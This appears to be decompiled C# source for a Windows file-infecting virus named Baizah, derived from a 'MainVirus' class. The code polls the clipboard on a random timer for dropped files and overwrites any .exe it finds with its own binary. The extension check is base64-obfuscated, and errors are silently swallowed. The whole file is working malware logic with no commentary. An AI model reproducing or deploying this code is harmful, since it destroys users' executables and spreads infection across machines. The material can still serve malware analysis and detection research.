using System;
using System.IO;
using System.Reflection;
using System.Security.Permissions;
using System.Windows.Forms;

namespace MSIL_Baizah;

public class Baizah : MainVirus
{
	private Timer myTimer = new Timer();

	private void TimerEventProcessor(object sender, EventArgs e)
	{
		IDataObject dataObject = Clipboard.GetDataObject();
		if (!dataObject.GetDataPresent(DataFormats.FileDrop))
		{
			return;
		}
		string[] array = (string[])dataObject.GetData(DataFormats.FileDrop);
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				FileInfo fileInfo = new FileInfo(text);
				if (fileInfo.Extension == MainVirus.Decode("LmV4ZQ=="))
				{
					CopyHost(text);
				}
			}
			catch
			{
			}
		}
	}

	private void CopyHost(string target)
	{
		FileInfo fileInfo = new FileInfo(Assembly.GetExecutingAssembly().GetModules()[0].FullyQualifiedName);
		FileInfo fileInfo2 = new FileInfo(target);
		if (!fileInfo2.Exists)
		{
			return;
		}
		try
		{
			Stream stream = fileInfo.OpenRead();
			Stream stream2 = fileInfo2.OpenWrite();
			BufferedStream bufferedStream = new BufferedStream(stream);
			BufferedStream bufferedStream2 = new BufferedStream(stream2);
			byte[] buffer = new byte[1024];
			int count;
			while ((count = bufferedStream.Read(buffer, 0, 1024)) > 0)
			{
				bufferedStream2.Write(buffer, 0, count);
			}
			bufferedStream2.Flush();
			bufferedStream.Close();
			bufferedStream2.Close();
		}
		catch (Exception)
		{
		}
	}

	[PermissionSet(SecurityAction.Deny, XML = "<PermissionSet class=\"System.Security.PermissionSet\"\r\n               version=\"1\">\r\n   <IPermission class=\"System.Security.Permissions.ReflectionPermission, mscorlib, Version=1.0.5000.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"\r\n                version=\"1\"\r\n                Flags=\"NoFlags\"/>\r\n</PermissionSet>\r\n")]
	public void Baiz()
	{
		myTimer.add_Tick((EventHandler)TimerEventProcessor);
		Random random = new Random();
		myTimer.set_Interval(random.Next(1000, 10000));
		myTimer.Start();
		while (true)
		{
			Application.DoEvents();
		}
	}
}
